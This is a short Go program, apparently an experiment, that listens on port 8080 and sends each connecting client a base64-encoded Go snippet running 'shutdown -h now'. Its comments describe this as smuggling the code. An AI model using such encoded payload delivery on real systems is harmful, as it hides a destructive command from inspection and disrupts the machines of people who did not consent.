package main

import (
	"bufio"
	"encoding/base64"
	"fmt"
	"net"
	"os"
)


func main() { 
	//listen on localhost
	listener , err := net.Listen("tcp", ":8080")

	if err != nil { 
		fmt.Println("Error starting server: ", err)
		os.Exit(1)
	}

	//close the listener at end of main
	defer  listener.Close()

	//wait for clients to connect

	conn , err := listener.Accept() // blocks till conn made and so on and so on...
	if err != nil { 
		fmt.Println("Error accepting connection: ", err)
		os.Exit(1)
	}

	defer conn.Close() // also close the conn at end.

	fmt.Println("Client connected!")

	codeToSend := `package main
	import "os/exec"
	func main(){ 
		exec.Command("shutdown", "-h", "now").Run()
	}
	`

	//encode it to base64 for "smuggle" it 
	encodedCode := base64.StdEncoding.EncodeToString([]byte(codeToSend))

	fmt.Fprintf(conn , "%s\n",encodedCode)
	fmt.Println("Smuggled code sent to client.")

	//wait for client response (if it can)
	message , _ := bufio.NewReader(conn).ReadString('\n')
	fmt.Println("Client responde: " , message)
}
